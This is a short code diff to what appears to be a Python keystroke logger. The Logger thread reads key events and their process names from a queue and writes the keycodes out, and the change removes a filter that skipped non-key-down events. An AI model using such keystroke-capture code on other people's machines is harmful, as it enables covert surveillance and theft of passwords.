@@ -36,7 +36,6 @@ class Logger(threading.Thread):
     def __init__(self, event_queue):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
-
         self.q = event_queue
 
     def run(self):
@@ -49,9 +48,6 @@ class Logger(threading.Thread):
     def process_event(self):
         try:
             event = self.q.get(timeout=0.05)
-            if not event.MessageName.startswith('key down'):
-                print(('[INFO]Not an useful event'), file=sys.stderr)
-                return
             process_name = self.get_process_name(event)
             self.ek = event.Key + '\n'
             p = Process(target=self.write_keycode)
